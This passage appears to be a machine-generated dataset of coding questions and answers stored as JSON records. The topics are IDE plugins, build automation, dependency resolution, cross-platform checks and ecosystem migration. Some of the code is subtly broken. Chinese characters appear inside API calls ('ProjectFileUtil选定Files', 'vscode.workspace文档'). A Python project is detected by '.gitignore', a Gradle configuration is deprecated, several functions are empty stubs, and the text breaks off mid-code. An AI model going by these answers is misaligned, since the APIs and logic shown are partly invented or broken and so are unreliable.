language.\n\nProblem:\nYou have created a custom programming language called \"MyLang\" that follows a syntax similar to Python and C++. Your team needs a plugin for popular IDEs to improve developer productivity by providing syntax highlighting and code completion.\n\nSolution:\nFor this problem, we will focus on the \"Integration with IDEs\" concept and create a Visual Studio Code extension to support MyLang. We will use JavaScript and the VSCode Extension API.\n\nExample code (JavaScript, VSCode Extension API):\n```javascript\n// mylang-extension/package.json\n{\n  \"name\": \"mylang\",\n  \"displayName\": \"MyLang\",\n  \"description\": \"Syntax highlighting and code completion for MyLang\",\n  \"version\": \"0.0.1\",\n  \"publisher\": \"mylang\",\n  \"engines\": {\n    \"vscode\": \"^1.65.0\"\n  },\n  \"categories\": [\n    \"Languages\"\n  ],\n  \"contributes\": {\n    \"languages\": [{\n      \"id\": \"mylang\",\n      \"aliases\": [\"MyLang\", \"mylang\"],\n      \"extensions\": [\".my\"],\n      \"configuration\": \"./mylang.configuration.json\"\n    }],\n    \"grammars\": [{\n      \"language\": \"mylang\",\n      \"scopeName\": \"source.mylang\",\n      \"path\": \"./syntaxes/mylang.tmLanguage.json\"\n    }],\n    \"snippets\": [{\n      \"language\": \"mylang\",\n      \"path\": \"./snippets/mylang.code-snippets\"\n    }]\n  }\n}\n```\nThis `package.json` file defines a basic structure for a Visual Studio Code extension that contributes a new language, MyLang. It includes language metadata, a grammar file for syntax highlighting, and a snippets file for code completion.\n\n- `mylang.configuration.json` would contain settings for the language, such as indentation rules.\n- `mylang.tmLanguage.json` should define the syntax highlighting rules for MyLang, based on its syntax.\n- `mylang.code-snippets` would contain code snippets for common MyLang constructs to enable code completion.\n\nQuestion 2: Implement a feature in an IntelliJ IDEA plugin to automatically format and lint code written in a custom programming language, ensuring compliance with a predefined style guide.\n\nProblem:\nYou're working on an IntelliJ IDEA plugin to support the \"MyLang\" programming language. The plugin should automatically format the code according to a style guide and identify potential issues (linting).\n\nSolution:\nWe'll focus on the \"Integration with IDEs\" concept again and create a plugin for IntelliJ IDEA using Java and the IntelliJ Platform SDK.\n\nExample code (Java, IntelliJ Platform SDK):\n```java\n// MyLangFormatAction.java\nimport com.intellij.openapi.actionSystem.AnAction;\nimport com.intellij.openapi.actionSystem.AnActionEvent;\nimport com.intellij.openapi.application.ApplicationManager;\nimport com.intellij.openapi.command.WriteCommandAction;\nimport com.intellij.openapi.project.Project;\nimport com.intellij.psi.PsiFile;\nimport com.intellij.psi.codeStyle.CodeStyleManager;\nimport org.jetbrains.annotations.NotNull;\n\npublic class MyLangFormatAction extends AnAction {\n    @Override\n    public void actionPerformed(@NotNull AnActionEvent e) {\n        Project project = e.getProject();\n        if (project == null) {\n            return;\n        }\n\n        PsiFile[] psiFiles = ProjectFileUtil\u9009\u5b9aFiles(project, e.getDataContext());\n        for (PsiFile psiFile : psiFiles) {\n            if (psiFile.getFileType() == MyLangFileType.INSTANCE) {\n                WriteCommandAction.runWriteCommandAction(project, () -> {\n                    CodeStyleManager codeStyleManager = CodeStyleManager.getInstance(project);\n                    codeStyleManager.reformat(psiFile);\n                });\n            }\n        }\n    }\n}\n```\nThis `MyLangFormatAction` class defines an action that can be triggered in IntelliJ IDEA, such as through the \"Format Code\" menu. It checks if the selected file is of the `MyLangFileType` and, if so, reformats the code using the specified style guide.\n\nTo implement the linting part, you would create a `MyLangLintInspection` class extending `LocalInspectionTool` and register it in the plugin's `plugin.xml` file. The linting would be done during code analysis, highlighting potential issues based on your custom rules.\n\nPlease note that the actual syntax highlighting, code formatting rules, and linting rules for MyLang would need to be defined in separate files and integrated into the plugin. The provided code just serves as a starting point for integrating the formatting and linting features into the IntelliJ IDEA plugin."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Integration with IDEs", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a custom IDE plugin that supports real-time collaborative coding with syntax highlighting, code completion, and a live error detection system across multiple programming languages. The plugin should integrate seamlessly with popular IDEs like Visual Studio Code, IntelliJ IDEA, and PyCharm.\n\n**Concept**: Integration with IDEs\n\nSolution:\nTo create a plugin with the mentioned features, we will use the WebSockets for real-time communication and the TextMate grammars for syntax highlighting. We'll focus on Visual Studio Code as an example, but the approach can be adapted for other IDEs.\n\n1. Backend (Node.js with WebSocket):\n```javascript\nconst express = require('express');\nconst WebSocket = require('ws');\nconst fs = require('fs');\n\nconst app = express();\nconst server = require('http').createServer(app);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', (ws) => {\n  const clientId = ws._socket.remoteAddress;\n  \n  ws.on('message', (message) => {\n    // Broadcast code changes to all connected clients\n    wss.clients.forEach((client) => {\n      if (client.readyState === WebSocket.OPEN && clientId !== client._socket.remoteAddress) {\n        client.send(message);\n      }\n    });\n  });\n  \n  // Handle client disconnection\n  ws.on('close', () => {\n    console.log(`Client ${clientId} disconnected.`);\n  });\n});\n\n// Serve the TextMate grammars for syntax highlighting\napp.use('/syntaxes', express.static('syntaxes'));\n\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});\n```\n1. Frontend (VS Code extension):\n```typescript\nimport * as vscode from 'vscode';\nimport WebSocket from 'ws';\n\ninterface CodeChange {\n  clientId: string;\n  text: string;\n  range: vscode.Range;\n  rangeLength: number;\n  ops: any[];\n}\n\nexport function activate(context: vscode.ExtensionContext) {\n  const workspaceFolders = vscode.workspace.workspaceFolders;\n  if (!workspaceFolders) {\n    return;\n  }\n\n  const ws = new WebSocket(`ws://localhost:3000`);\n  ws.on('message', (data) => {\n    const change: CodeChange = JSON.parse(data);\n    if (change.clientId !== context.storagePath) {\n      applyCodeChange(change);\n    }\n  });\n\n  vscode.workspace.onDidChangeTextDocument((event) => {\n    const change: CodeChange = {\n      clientId: context.storagePath,\n      text: event.contentChanges[0].text,\n      range: event.contentChanges[0].range,\n      rangeLength: event.contentChanges[0].rangeLength,\n      ops: []\n    };\n    ws.send(JSON.stringify(change));\n  });\n}\n\nfunction applyCodeChange(change: CodeChange) {\n  const document = vscode.workspace\u6587\u6863(event.document.uri);\n  const editor = vscode.window.visibleTextEditors.find(editor => editor.document === document);\n  if (editor) {\n    editor.edit(editBuilder => {\n      editBuilder.replace(change.range, change.text);\n    });\n  }\n}\n```\nThis solution provides a basic outline for a collaborative coding plugin. The backend handles real-time communication, while the frontend extension listens for changes and updates the editor accordingly. You'd need to extend this solution to support code completion and error detection, which would involve integrating with the respective LSP (Language Server Protocol) or using existing libraries for each programming language.\n\nQuestion 2: Implement a plugin for an IDE that integrates with a version control system (VCS) like Git, allowing users to perform complex merge conflict resolution directly within the IDE with the help of a visual diff tool and conflict resolver.\n\n**Concept**: Integration with IDEs\n\nSolution:\nFor this problem, we'll focus on implementing a Git merge conflict resolver for Visual Studio Code using its extension API.\n\n1. Frontend (VS Code extension):\n```typescript\nimport * as vscode from 'vscode';\n\ninterface ConflictRange {\n  start: vscode.Position;\n  end: vscode.Position;\n  original: string;\n  modified: string;\n}\n\nexport function activate(context: vscode.ExtensionContext) {\n  vscode.commands.registerCommand('extension.resolveMergeConflict', async () => {\n    const editor = vscode.window.activeTextEditor;\n    if (!editor) {\n      return;\n    }\n\n    const document = editor.document;\n    const conflicts: ConflictRange[] = findMergeConflicts(document);\n\n    // Show a custom editor with the conflict ranges highlighted and a visual diff tool\n    const diffEditor = await showDiffEditor(conflicts);\n\n    // Handle user resolution actions and apply changes to the original document\n    const resolution = await vscode.window.showInputBox({ prompt: 'Enter the resolved text' });\n    if (resolution) {\n      applyResolution(diffEditor, resolution);\n      await vscode.commands.executeCommand('workbench.action.closeAllEditors');\n    }\n  });\n}\n\nfunction findMergeConflicts(document: vscode.TextDocument): ConflictRange[] {\n  // Implement a regular expression or parser to identify merge conflict markers and extract ranges\n}\n\nasync function showDiffEditor(conflicts: ConflictRange[]) {\n  // Create a custom editor with conflict ranges highlighted and a diff view\n}\n\nfunction applyResolution(diffEditor, resolution) {\n  // Update the original document with the resolved text and remove conflict markers\n}\n```\nThis solution provides a high-level overview of creating a Git merge conflict resolver within an IDE. You'll need to implement the `findMergeConflicts` function to identify merge conflict markers in the document, create a custom editor with visual diff tools, and handle user interactions for conflict resolution. You'll also need to interact with the Git API to commit the resolved changes.\n\nKeep in mind that developing a complete and robust solution for either question would involve considerable effort, as they both touch on complex aspects of IDE integration, real-time communication, and version control systems."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Build automation", "Complexity_Level": "medium", "Response": "Question 1:\n**Problem:**\nYou are working on a project with multiple developers, and you need to automate the build process to compile, test, and package the application. You want to implement a solution that uses Gradle as the build tool for a Java application.\n\n**Concept:**\n{\"Concept\": \"Build Automation\"}\n\n**Solution:**\nCreate a Gradle build script (`build.gradle`) that compiles the Java source, runs tests, and creates a JAR file.\n\n```groovy\nplugins {\n    id 'java'\n    id 'application'\n    id 'com.github.johnrengelman.shadow' version '7.1.2' // For creating a fat JAR\n}\n\ngroup 'com.example'\nversion '1.0-SNAPSHOT'\n\nmainClassName = 'com.example.App'\n\nsourceSets {\n    main {\n        java {\n            srcDirs 'src/main/java'\n        }\n    }\n    test {\n        java {\n            srcDirs 'src/test/java'\n        }\n    }\n}\n\nrepositories {\n    mavenCentral()\n}\n\ndependencies {\n    implementation 'org.junit.jupiter:junit-jupiter-api:5.8.2'\n    testRuntimeOnly 'org.junit.jupiter:junit-jupiter-engine:5.8.2'\n}\n\ntest {\n    useJUnitPlatform()\n}\n\njar {\n    manifest {\n        attributes 'Implementation-Title': 'Example Application',\n                   'Implementation-Version': version\n    }\n    from {\n        configurations.compile.collect {\n            it.isDirectory() ? it : zipTree(it)\n        }\n    }\n}\n\ntask runApp(type: JavaExec) {\n    main = mainClassName\n    classpath = sourceSets.main.runtimeClasspath\n}\n```\n\nTo build, test, and create the JAR, run the following commands in the terminal:\n\n```sh\n# Compile and test\ngradle test\n\n# Package the JAR (including dependencies)\ngradle shadowJar\n\n# Run the application\ngradle runApp\n```\n\nQuestion 2:\n**Problem:**\nYou're working on a Python project that depends on various libraries and requires a consistent environment across developer machines. You need to set up a build automation script using Poetry to manage dependencies and create a virtual environment.\n\n**Concept:**\n{\"Concept\": \"Build Automation\"}\n\n**Solution:**\nCreate a `pyproject.toml` file to define the project and dependencies using Poetry.\n\n```toml\n[tool.poetry]\nname = \"example_project\"\nversion = \"0.1.0\"\ndescription = \"A sample Python project\"\nauthors = [\"Your Name <your.email@example.com>\"]\n\n[tool.poetry.dependencies]\npython = \"3.9\"\nrequests = \"^2.26.0\"\npytest = \"^6.2.5\"\n\n[tool.poetry.dev-dependencies]\nblack = \"^21.12b0\"\nflake8 = \"^3.9.2\"\n\n[build-system]\nrequires = [\"poetry-core>=1.0.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n```\n\nNow, create a `Makefile` to automate build, testing, and formatting tasks:\n\n```make\ninstall:\n\tpoetry install\n\ntest:\n\tpoetry run pytest\n\nformat:\n\tpoetry run black .\n\nlint:\n\tpoetry run flake8\n\nclean:\n\trm -rf .venv\n\tpoetry env remove python\n\nall: install test format lint\n```\n\nTo use the `Makefile`, run the following commands in the terminal:\n\n```sh\n# Install dependencies\nmake install\n\n# Run tests\nmake test\n\n# Format the code\nmake format\n\n# Lint the code\nmake lint\n\n# Clean the virtual environment and dependencies\nmake clean\n```\n\nThese commands automate the build process, making it easier for developers to contribute to the project consistently."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Build automation", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a fully customizable build automation tool in Python that supports multiple programming languages, integrates with various version control systems (VCS), and performs complex dependency management and artifact publishing. The tool should dynamically detect project configurations, support parallel execution, and handle caching for efficient rebuilding.\n\nConcept: Build Automation\n\nSolution:\n```python\nimport os\nimport subprocess\nimport hashlib\nimport json\nimport requests\nfrom concurrent.futures import ThreadPoolExecutor\n\nclass BuildSystem:\n    def __init__(self, project_dir, vcs, language_mapping, artifact_repo_url):\n        self.project_dir = project_dir\n        self.vcs = vcs\n        self.language_mapping = language_mapping\n        self.artifact_repo_url = artifact_repo_url\n        self.cache = {}\n\n    def detect_project_config(self):\n        config_files = {\n            \"Python\": \".gitignore\",\n            \"Java\": \"pom.xml\",\n            \"JavaScript\": \"package.json\",\n            # ...\n        }\n        for lang, file in config_files.items():\n            if os.path.exists(os.path.join(self.project_dir, file)):\n                return lang\n        raise ValueError(\"No project configuration detected.\")\n\n    def get_dependencies(self, language):\n        dependencies_file = {\n            \"Python\": \"requirements.txt\",\n            \"Java\": \"pom.xml\",\n            \"JavaScript\": \"package-lock.json\",\n            # ...\n        }\n        file_path = os.path.join(self.project_dir, dependencies_file[language])\n        with open(file_path, \"r\") as f:\n            return f.read()\n\n    def cache_dependencies(self, language, dependencies):\n        hash_value = hashlib.sha256(dependencies.encode()).hexdigest()\n        cache_key = f\"{language}_{hash_value}\"\n        if cache_key not in self.cache:\n            self.cache[cache_key] = self.download_dependencies(language, dependencies)\n        return self.cache[cache_key]\n\n    def download_dependencies(self, language, dependencies):\n        # Download and install dependencies for the given language\n        pass\n\n    def build_project(self, language, dependencies):\n        build_command = {\n            \"Python\": \"python setup.py build\",\n            \"Java\": \"mvn package\",\n            \"JavaScript\": \"npm ci && npm run build\",\n            # ...\n        }\n        return subprocess.run(build_command[language], cwd=self.project_dir, shell=True)\n\n    def publish_artifacts(self, artifacts):\n        for artifact in artifacts:\n            response = requests.post(self.artifact_repo_url, files={\"file\": open(artifact, \"rb\")})\n            if response.status_code != 201:\n                raise Exception(f\"Failed to publish artifact: {response.text}\")\n\n    def run(self):\n        language = self.detect_project_config()\n        dependencies = self.get_dependencies(language)\n        cached_dependencies = self.cache_dependencies(language, dependencies)\n        build_result = self.build_project(language, cached_dependencies)\n\n        if build_result.returncode == 0:\n            artifacts = self.find_artifacts(language)\n            self.publish_artifacts(artifacts)\n        else:\n            print(\"Build failed.\")\n\n    def find_artifacts(self, language):\n        # Search and return the built artifacts for the given language\n        pass\n\nif __name__ == \"__main__\":\n    project_dir = \"/path/to/project\"\n    vcs = \"git\"  # Example: \"git\", \"svn\", \"mercurial\"\n    artifact_repo_url = \"https://example.com/api/artifacts\"\n    language_mapping = {\n        \"Python\": \"python\",\n        \"Java\": \"java\",\n        \"JavaScript\": \"javascript\",\n        # ...\n    }\n    build_system = BuildSystem(project_dir, vcs, language_mapping, artifact_repo_url)\n    build_system.run()\n```\nThis solution is a high-level outline and would require additional implementation details for each language-specific task, such as downloading dependencies and finding built artifacts. However, it provides a foundation for a"}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Dependency resolution", "Complexity_Level": "medium", "Response": "Question 1:\n\n**Problem:**\nIn a Node.js project, you are managing dependencies with `npm`. You have a package.json file where you need to install two dependencies, `express` and `axios`, but you also want to ensure that `express` is at version 4.17.2, and `axios` is at version 0.21.1. However, `axios` has a peer dependency on `lodash` version 4.17.20, and you must install the correct version as well.\n\n**Solution:**\n\nTo solve this problem, you will use the `npm install` command with the specific version numbers.\n\n```bash\n# Install express with the required version\nnpm install express@4.17.2\n\n# Install axios with the required version\nnpm install axios@0.21.1\n\n# Install lodash to satisfy axios's peer dependency with the required version\nnpm install lodash@4.17.20\n```\n\nAfter running these commands, your `package.json` file will have the specified versions of the dependencies and the peer dependency installed.\n\nQuestion 2:\n\n**Problem:**\nIn a Python project, you use `pip` for dependency management. You want to create a `requirements.txt` file that lists the required packages and their specific versions, including `requests` at version 2.25.1, `pandas` at version 1.1.5, and `numpy` at version 1.19.3. Additionally, the project has a conditional dependency on `beautifulsoup4` which should only be installed if a specific environment variable `INSTALL_BS4` is set to a non-empty value.\n\n**Solution:**\n\nCreate a `requirements.txt` file with the following content:\n\n```txt\nrequests==2.25.1\npandas==1.1.5\nnumpy==1.19.3\n\n# Conditional dependency\nbeautifulsoup4==4.9.3\n```\n\nThen, use a script to handle the conditional installation of `beautifulsoup4`:\n\n```python\nimport os\nimport subprocess\n\nif os.environ.get('INSTALL_BS4', ''):\n    subprocess.run(['pip', 'install', 'beautifulsoup4'])\n```\n\nYou can run this script after setting the `INSTALL_BS4` environment variable:\n\n```bash\nINSTALL_BS4=1 python install_dependencies.py\n```\n\nThis will install the packages specified in `requirements.txt`, and if `INSTALL_BS4` is set, it will also install `beautifulsoup4`."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Dependency resolution", "Complexity_Level": "extremely difficult", "Response": "**Question 1:**\nIn a large monorepo with multiple interdependent projects, the current dependency resolution system is causing slow build times and version conflicts. Develop a custom dependency resolver that efficiently identifies and resolves transitive dependencies, implements a lock file for reproducible builds, and supports circular dependency detection and resolution. The resolver should be language-agnostic and integrate with a package manager like npm, pip, or Cargo.\n\n**Solution:**\nConcept: Dependency Resolution, Package Manager Integration\n\n```python\n# A simplified Python class representing the custom dependency resolver\nfrom typing import Dict, List, Set\nimport json\n\nclass CustomResolver:\n    def __init__(self, package_manager: str):\n        self.package_manager = package_manager\n        self.project_dependencies: Dict[str, List[str]] = {}\n        self.transitive_deps: Dict[str, Set[str]] = {}\n        self.lock_file: Dict[str, Dict[str, str]] = {}\n\n    def load_dependencies(self, project_root: str):\n        # Load dependencies from package.json, requirements.txt, or Cargo.toml\n        with open(f\"{project_root}/{self.package_manager}_file.json\", \"r\") as f:\n            data = json.load(f)\n            self.project_dependencies = data[\"dependencies\"]\n\n    def resolve_transitive_deps(self):\n        # Perform a topological sort on the dependency graph\n        # (O(V + E) complexity, V - number of projects, E - number of dependencies)\n        for project, deps in self.project_dependencies.items():\n            self.transitive_deps[project] = self._get_transitive_deps(project, set())\n\n    def _get_transitive_deps(self, project: str, visited: Set[str]) -> Set[str]:\n        if project in visited:\n            raise Exception(f\"Circular dependency detected: {visited} -> {project}\")\n        visited.add(project)\n        transitive_deps = set([project])\n        for dep in self.project_dependencies[project]:\n            transitive_deps.update(self._get_transitive_deps(dep, visited))\n        return transitive_deps\n\n    def detect_and_resolve_circular_deps(self):\n        for project, deps in self.transitive_deps.items():\n            if len(deps) > 1 and project in deps:\n                # Implement a strategy to break circular dependencies, e.g., selective version bumps or splitting modules\n                print(f\"Circular dependency detected in {project}. Resolving...\")\n\n    def write_lock_file(self, lock_file_path: str):\n        # Generate a lock file with resolved versions for each dependency\n        for project, deps in self.transitive_deps.items():\n            for dep in deps:\n                # Query the package manager for the exact version\n                exact_version = self._query_package_manager(project, dep)\n                self.lock_file[project][dep] = exact_version\n\n        with open(lock_file_path, \"w\") as f:\n            json.dump(self.lock_file, f, indent=2)\n\n    def _query_package_manager(self, project: str, dep: str) -> str:\n        # Call the package manager CLI to resolve the exact version (e.g., npm, pip, or cargo)\n        # Implementation depends on the package manager API\n        pass\n\n# Example usage\nresolver = CustomResolver(\"npm\")\nresolver.load_dependencies(\"/path/to/monorepo\")\nresolver.resolve_transitive_deps()\nresolver.detect_and_resolve_circular_deps()\nresolver.write_lock_file(\"/path/to/monorepo/lock_file.json\")\n```\n\n**Question 2:**\nDesign a distributed dependency resolution system that can handle millions of packages and their dependencies, ensuring high availability, scalability, and low latency. The system should handle version conflicts and be resilient to failures in the network or nodes.\n\n**Solution:**\nConcept: Distributed Systems, Consistency Models\n\n```python\n# A simplified Python class representing the distributed dependency resolver\nfrom distributed import Client, Lock\nfrom typing import Dict, List, Set\nimport json\n\nclass DistributedResolver:\n    def __init__(self, client: Client):\n        self.client = client\n        self.package_registry: Dict[str, Dict[str, List[str]]] = {}\n        self.locks = {}\n\n    def load_package_registry(self, registry_data: Dict[str, Dict[str, List[str]]]):\n        self.package_registry = registry_data\n        self.locks = {package: Lock(f\"dependency-lock-{package}\") for package in registry_data}\n\n    def resolve_deps(self, project: str) -> Dict[str, Set[str]]:\n        with self.locks[project]:\n            transitive_deps = set([project])\n            for dep in self.package_registry[project][\"dependencies\"]:\n                transitive_deps.update(self.resolve_deps(dep))\n            return transitive_deps\n\n    def detect_and_resolve_version_conflicts(self, project: str, deps: Set[str]):\n        # Implement a conflict resolution strategy, e.g., using semantic versioning or user-defined rules\n        pass\n\n    def update_package_registry(self, project: str, updates: Dict[str, List[str]]):\n        with self.locks[project]:\n            self.package_registry[project].update(updates)\n\n    def handle_failures(self, failed_projects: List[str]):\n        # Implement a recovery strategy, e.g., re-resolve dependencies or notify an operator\n        pass\n\n# Example usage with a distributed client (using Dask)\nfrom dask.distributed import LocalCluster\n\ncluster = LocalCluster()\nclient = Client(cluster)\n\nresolver = DistributedResolver(client)\nresolver.load_package_registry({\n    \"project1\": {\"dependencies\": [\"project2\", \"project3\"]},\n    \"project2\": {\"dependencies\": [\"project4\"]},\n    \"project3\": {\"dependencies\": [\"project5\"]},\n    \"project4\": {\"dependencies\": []},\n    \"project5\": {\"dependencies\": []}\n})\n\ntransitive_deps = resolver.resolve_deps(\"project1\")\n\n# Simulate a failure during version conflict resolution\nresolver.handle_failures([\"project2\"])\n```\n\nThese solutions are simplified examples and may require additional logic to integrate with actual package managers or distributed systems. The focus is on demonstrating the complexity of dependency resolution, managing transitive dependencies, circular dependency detection, and resilience in a distributed system."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Cross-platform compatibility checks", "Complexity_Level": "medium", "Response": "Question 1: Develop a script that checks if a given package is installed and up-to-date on multiple operating systems (Windows, macOS, and Linux). If the package is outdated, the script should provide an update prompt.\n\nConcept: Cross-platform compatibility checks, Package management\n\nSolution:\n```python\nimport subprocess\nimport platform\n\ndef check_package(package_name):\n    system = platform.system()\n    \n    if system == \"Windows\":\n        command = [\"powershell\", \"-Command\", \"Get-Package -Name '{}' -AllVersions | Select-Object -First 1\".format(package_name)]\n    elif system == \"Darwin\":  # macOS\n        command = [\"brew\", \"outdated\", package_name]\n    elif system == \"Linux\":\n        if subprocess.run([\"command\", \"-v\", \"apt-get\"], stdout=subprocess.DEVNULL).returncode == 0:\n            command = [\"apt-get\", \"install\", \"-y\", \"--only-upgrade\", package_name]\n        elif subprocess.run([\"command\", \"-v\", \"yum\"], stdout=subprocess.DEVNULL).returncode == 0:\n            command = [\"yum\", \"upgrade\", package_name]\n        elif subprocess.run([\"command\", \"-v\", \"dnf\"], stdout=subprocess.DEVNULL).returncode == 0:\n            command = [\"dnf\", \"upgrade\", package_name]\n        else:\n            print(\"Unsupported Linux distribution\")\n            return\n    \n    try:\n        output = subprocess.check_output(command, stderr=subprocess.STDOUT)\n        \n        if \"is not installed\" in output.decode().lower() or \"not currently installed\" in output.decode().lower():\n            print(\"Package {} is not installed. Please install it.\".format(package_name))\n        elif \"up-to-date\" in output.decode().lower():\n            print(\"Package {} is up-to-date.\".format(package_name))\n        else:\n            print(\"A newer version of {} is available. Run the following command to update:\\n{}\".format(package_name, \" \".join(command)))\n    except subprocess.CalledProcessError as e:\n        print(\"Error checking package status: {}\".format(e.output.decode()))\n\n# Example usage\ncheck_package(\"python\")\n```\nQuestion 2: Write a function that detects if the current system has a compatible version of Python 3 installed. If not, the function should provide instructions on how to install it for different platforms.\n\nConcept: Cross-platform compatibility checks, Python version checking\n\nSolution:\n```python\nimport platform\nimport subprocess\n\ndef check_python3():\n    system = platform.system()\n    \n    if system == \"Windows\":\n        python_version_command = \"py --version\"\n    elif system == \"Darwin\":  # macOS\n        python_version_command = \"python3 --version\"\n    elif system == \"Linux\":\n        python_version_command = \"python3 --version\"\n    \n    try:\n        output = subprocess.check_output(python_version_command, shell=True, stderr=subprocess.STDOUT)\n        \n        if \"Python 3.\" in output.decode():\n            print(\"Python 3 is installed. Version: \", output.decode().split()[1])\n        else:\n            print(\"Python 3 is not installed or not in the PATH.\")\n            if system == \"Windows\":\n                print(\"To install Python 3 on Windows, visit https://www.python.org/downloads/windows/\")\n            elif system == \"Darwin\":\n                print(\"To install Python 3 on macOS, use Homebrew: brew install python\")\n            elif system == \"Linux\":\n                if \"apt-get\" in subprocess.check_output([\"command\", \"-v\", \"apt-get\"], stderr=subprocess.DEVNULL).decode():\n                    print(\"To install Python 3 on Ubuntu/Debian, run: sudo apt-get install python3\")\n                elif \"yum\" in subprocess.check_output([\"command\", \"-v\", \"yum\"], stderr=subprocess.DEVNULL).decode():\n                    print(\"To install Python 3 on CentOS/Red Hat, run: sudo yum install python3\")\n                else:\n                    print(\"Unsupported Linux distribution. Check your package manager to install Python 3.\")\n    except subprocess.CalledProcessError as e:\n        print(\"Error checking Python version: {}\".format(e.output.decode()))\n\n# Example usage\ncheck_python3()\n```\nThese scripts check for the presence and version of a package or Python 3, respectively, and provide platform-specific instructions when necessary."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Cross-platform compatibility checks", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: Develop a comprehensive testing framework that ensures cross-platform compatibility for a complex, multi-threaded application written in C++. The application uses custom libraries and has dependencies on system-specific APIs, requiring intricate compatibility checks across Windows, macOS, and Linux.\n\nSolution:\nConcept: Cross-platform compatibility, Multi-threading, Custom library testing\n\nHere's an example of a high-level design for a testing framework using C++ and the CMake build system. The example focuses on setting up the infrastructure for testing, not the actual tests themselves, as the complexity lies in managing the compatibility checks and threading.\n\n1. Use CMake for platform-agnostic builds:\n```cmake\ncmake_minimum_required(VERSION 3.10)\nproject(CrossCompatApp)\n\n# Add source files\nfile(GLOB SOURCES \"src/*.cpp\")\nfile(GLOB TEST_SOURCES \"tests/*.cpp\")\n\n# Add custom library\nadd_library(MyLib SHARED ${SOURCES})\ntarget_include_directories(MyLib PUBLIC include)\n\n# Add platform-specific flags\nif(APPLE)\n    target_link_libraries(MyLib -framework Cocoa)\nelseif(UNIX)\n    target_link_libraries(MyLib -lpthread)\nelseif(WIN32)\n    target_link_libraries(MyLib ws2_32)\nendif()\n\n# Add unit tests\nenable_testing()\nadd_executable(TestApp ${TEST_SOURCES})\ntarget_link_libraries(TestApp MyLib)\n\nif(UNIX)\n    target_link_libraries(TestApp -lpthread)\nendif()\nadd_test(NAME TestApp COMMAND TestApp)\n```\n1. Implement a platform abstraction layer (PAL) for system-specific APIs:\n```cpp\n// pal.h\n#ifndef PAL_H\n#define PAL_H\n\n#include <string>\n\nenum class Platform {\n    Windows,\n    macOS,\n    Linux\n};\n\n// Detects the current platform\nPlatform getCurrentPlatform();\n\n// Platform-specific API implementations\nclass PlatformAPI {\npublic:\n    virtual ~PlatformAPI() = default;\n    virtual void doSomethingPlatformSpecific() = 0;\n};\n\n// Windows implementation\nclass PlatformAPIWindows : public PlatformAPI {\npublic:\n    void doSomethingPlatformSpecific() override;\n};\n\n// macOS implementation\nclass PlatformAPIMac : public PlatformAPI {\npublic:\n    void doSomethingPlatformSpecific() override;\n};\n\n// Linux implementation\nclass PlatformAPILinux : public PlatformAPI {\npublic:\n    void doSomethingPlatformSpecific() override;\n};\n\n#endif // PAL_H\n```\n1. Create a thread-safe singleton for managing the platform API:\n```cpp\n// platform_manager.h\n#ifndef PLATFORM_MANAGER_H\n#define PLATFORM_MANAGER_H\n\n#include <mutex>\n#include \"pal.h\"\n\nclass PlatformManager {\npublic:\n    static PlatformManager& getInstance() {\n        static PlatformManager instance;\n        return instance;\n    }\n\n    PlatformAPI& getPlatformAPI() {\n        std::lock_guard<std::mutex> lock(mutex_);\n        if (!platformAPI_) {\n            initPlatformAPI();\n        }\n        return *platformAPI_;\n    }\n\nprivate:\n    PlatformManager() = default;\n    PlatformManager(const PlatformManager&) = delete;\n    PlatformManager& operator=(const PlatformManager&) = delete;\n\n    void initPlatformAPI() {\n        Platform platform = getCurrentPlatform();\n        switch (platform) {\n            case Platform::Windows:\n                platformAPI_ = std::make_unique<PlatformAPIWindows>();\n                break;\n            case Platform::macOS:\n                platformAPI_ = std::make_unique<PlatformAPIMac>();\n                break;\n            case Platform::Linux:\n                platformAPI_ = std::make_unique<PlatformAPILinux>();\n                break;\n        }\n    }\n\n    std::unique_ptr<PlatformAPI> platformAPI_;\n    std::mutex mutex_;\n};\n#endif // PLATFORM_MANAGER_H\n```\nThis example sets\n```"}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Ecosystem migration tools", "Complexity_Level": "medium", "Response": "The given JSON doesn't explicitly cover \"Coding Ecosystem\" or \"Ecosystem migration tools\" as a domain. However, a relevant concept within the context of programming languages and development is \"Package Managers\" and \"Dependency Management\", which often play a role in migrating applications or libraries across ecosystems.\n\nQuestion 1:\n**Problem:** You are working on a Node.js project that uses several npm packages, and you need to migrate the project to a Python environment using pip packages. Develop a script or tool to map equivalent npm packages to their Python (pip) counterparts.\n\n**Solution:**\nCreate a Python script to map npm package names to their equivalent Python packages. The script will use a predefined mapping file and convert the `package.json` file.\n\n**Concept**: Dependency Management\n\n```python\nimport json\n\n# Mapping file (npm to pip)\nnpm_to_pip_mapping = {\n    \"lodash\": \"lodash-python\",\n    \"express\": \"flask\",\n    \"axios\": \"requests\",\n    # ... more mappings\n}\n\n# Read package.json\nwith open('package.json', 'r') as f:\n    npm_packages = json.load(f)['dependencies']\n\npip_packages = {}\nfor npm_package, version in npm_packages.items():\n    pip_package_name = npm_to_pip_mapping.get(npm_package)\n    if pip_package_name:\n        pip_packages[pip_package_name] = version\n    else:\n        print(f\"No equivalent pip package found for: {npm_package}\")\n\n# Write requirements.txt\nwith open('requirements.txt', 'w') as f:\n    for pip_package, version in pip_packages.items():\n        f.write(f\"{pip_package}=={version}\\n\")\n```\n\nQuestion 2:\n**Problem:** A developer is migrating a Java application using Maven dependencies to a .NET project using NuGet packages. Create a script to convert the `pom.xml` file to a `.csproj` file.\n\n**Solution:**\nImplement a Python script that reads a `pom.xml` file and converts the dependencies to a `.csproj` format.\n\n**Concept**: Dependency Management\n\n```python\nimport xml.etree.ElementTree as ET\nimport os\n\ndef convert_maven_to_nuget(maven_xml, csproj_xml):\n    tree = ET.parse(maven_xml)\n    maven_root = tree.getroot()\n\n    nuget_root = ET.Element(\"Project\", {\"Sdk\": \"Microsoft.NET.Sdk\"})\n    nuget_items = 